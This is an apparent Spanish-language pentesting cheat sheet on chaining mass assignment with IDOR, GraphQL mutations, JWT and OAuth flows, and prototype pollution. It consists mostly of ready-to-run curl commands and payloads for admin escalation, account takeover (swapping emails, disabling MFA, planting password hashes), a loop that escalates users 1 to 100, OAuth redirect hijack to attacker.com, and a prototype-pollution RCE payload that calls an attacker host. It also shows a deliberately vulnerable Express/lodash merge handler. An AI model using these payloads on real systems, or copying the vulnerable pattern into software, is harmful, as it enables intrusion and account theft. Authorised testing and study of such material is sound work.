---
aliases:
  - Mass Assignment Chains
  - IDOR Mass Assignment
  - GraphQL Mass Assignment
tags:
  - vuln/mass-assignment
  - technique/lateral-movement
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Mass Assignment]]"
  - "[[BOLA - IDOR]]"
  - "[[Prototype Pollution]]"
  - "[[GraphQL Injection]]"
  - "[[JWT Attacks]]"
---
# Mass Assignment - Chains con Otras Vulns

***

## IDOR + Mass Assignment

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X PUT https://target/api/users/1 -H "Authorization: Bearer $MY_TOKEN" -d '{"role":"admin","email":"x@evil"}'` | Update directo de user 1 (admin) | IDOR + MA en user update. |
| `curl -X PATCH https://target/api/users/1 -d '{"password_hash":"$2b$10$<known>"}'` | Set known hash en victim | Backend acepta password_hash. |
| `curl -X PATCH https://target/api/users/1 -d '{"email":"atacante@evil.com","email_verified":true}'` | Hijack email victim → reset link | Email-based ATO chain. |
| `curl -X PATCH https://target/api/users/1 -d '{"is_active":true,"is_blocked":false,"mfa_enabled":false}'` | Restore + remove 2FA | Reactivar disabled account. |
| `curl -X PUT https://target/api/tenant/X/user/Y -d '{"tenant_id":"Z"}'` | Cross-tenant escape | Multi-tenant + IDOR. |
| `for id in {1..100}; do curl -s -X PATCH https://target/api/users/$id -H "Authorization: Bearer $TOK" -d '{"role":"admin"}'; done` | Bulk privesc enumeration | IDOR sin owner check. |
^ma-chain-idor

___

## GraphQL Mutation Mass Assignment

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{"query":"{__type(name:\"UserUpdateInput\"){inputFields{name type{name}}}}"}` | Discover todos los fields del input | Pre-explotación. |
| `{"query":"mutation{updateUser(input:{name:\"x\",isAdmin:true}){id isAdmin}}"}` | Privesc + verify en response | Standard. |
| `{"query":"mutation{updateUser(id:\"VXNlcjox\",input:{role:\"admin\"}){id role}}"}` | IDOR via global ID + MA | Relay-style + MA. |
| `{"query":"mutation{a:updateUser(id:\"VXNlcjox\",input:{role:\"admin\"}){id} b:updateUser(id:\"VXNlcjoy\",input:{role:\"admin\"}){id}}"}` | Mass MA via aliases | Multi-target en single request. |
| `{"query":"mutation($i:UserInput){updateUser(input:$i){id}}", "variables":{"i":{"isAdmin":true}}}` | MA via JSON variables | Bypass inline string filter. |
^ma-chain-graphql

### GraphQL workflow

```bash
# 1. Introspection
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__type(name:\"UserUpdateInput\"){inputFields{name}}}"}' \
  https://target/graphql

# 2. Mutation injection
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"mutation{updateUser(input:{email:\"test@x.com\",role:\"admin\",emailVerified:true}){id role isAdmin}}"}' \
  https://target/graphql
```

___

## JWT Update via Mass Assign

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X PATCH https://target/profile -d '{"role":"admin"}'` y revisar response/cookies | Nuevo JWT con role:admin | App regenera JWT post-update. |
| `curl -X POST https://target/oauth/refresh -H "Authorization: Bearer $TOK"` post-MA | Refresh token con scopes elevados | OAuth refresh lee model. |
| `curl -X PATCH https://target/profile -d '{"mfa_enabled":false}'` luego logout/login | Skip 2FA en próximo login | MFA disable + re-login. |
| `jwt-cli decode $NEW_TOKEN` | Verificar claims actualizados | Confirmar privesc. |
| `curl -X PATCH https://target/profile -d '{"permissions":[\"*\"]}'` y luego usar token | Permissions inject + reuse | Permissions claim regenerada. |
^ma-chain-jwt

___

## OAuth Scope Injection via MA

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST https://target/oauth/clients -d '{"name":"app","scopes":["admin","read","write"]}'` | Client OAuth con scopes elevados | Client registration vulnerable a MA. |
| `curl -X PATCH https://target/oauth/clients/X -d '{"redirect_uris":["http://attacker.com/cb"]}'` | OAuth redirect hijack | Combo Open Redirect + OAuth + MA. |
| `curl -X PATCH https://target/oauth/clients/X -d '{"trusted":true}'` | Skip consent screen victim | Phishing chain. |
| `curl -X PATCH https://target/oauth/clients/X -d '{"client_secret":"known_value"}'` | Pre-set client secret | Credentials forge. |
| `curl -X PATCH https://target/oauth/clients/X -d '{"owner_id":1}'` | Cross-org client takeover | Multi-tenant OAuth. |
^ma-chain-oauth

___

## Prototype Pollution Combo

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X PATCH https://target/api/users/1 -d '{"name":"x","__proto__":{"isAdmin":true}}'` | PP global + objeto local | Backend usa `_.merge` o similar. |
| `curl ... -d '{"name":"x","constructor":{"prototype":{"isAdmin":true}}}'` | PP variant cuando filter strip `__proto__` | Filter incompleto. |
| `curl ... -d '{"name":"x","__proto__":{"isAdmin":true},"isAdmin":true}'` | PP + MA simultáneo | Doble vector. |
| Confirmar PP: GET request after pollution → other users muestran `isAdmin:true` | Confirmación impacto global | Verificar polución persistente. |
| `curl ... -d '{"__proto__":{"toString":"$(curl http://attacker)"}}'` | PP RCE chain via gadget | App con gadget post-pollution. |
^ma-chain-pp

### Stack vulnerable a MA + PP

```javascript
// Node.js Express con lodash — vulnerable a ambos
app.patch('/api/users/:id', async (req, res) => {
    const user = await User.findById(req.params.id);
    _.merge(user, req.body);  // ← MA + PP vector
    await user.save();
    res.json(user);
});

// Atacante:
PATCH /api/users/1
{
  "name": "test",
  "isAdmin": true,                       // Mass Assignment directo
  "__proto__": {"globalAdmin": true}     // Prototype Pollution
}

// Resultado:
// - User 1 ahora isAdmin=true
// - Object.prototype.globalAdmin=true → todos los objetos heredan
```

***
